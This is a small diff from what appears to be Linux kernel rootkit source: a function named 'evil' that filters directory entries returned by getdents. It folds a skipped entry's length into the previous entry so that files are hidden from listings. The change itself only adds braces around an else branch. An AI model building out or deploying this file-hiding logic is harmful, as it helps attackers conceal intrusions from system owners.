@@ -71,8 +71,9 @@ int __always_inline evil(struct linux_dirent __user * dirent, int res, int fd) {
 				continue;
 			}
 			prev->d_reclen += kdir->d_reclen;
-		} else
+		} else {
 			prev = kdir;
+		}
 		off += kdir->d_reclen;
 	}
 	err = copy_to_user(dirent, kdirent, res);
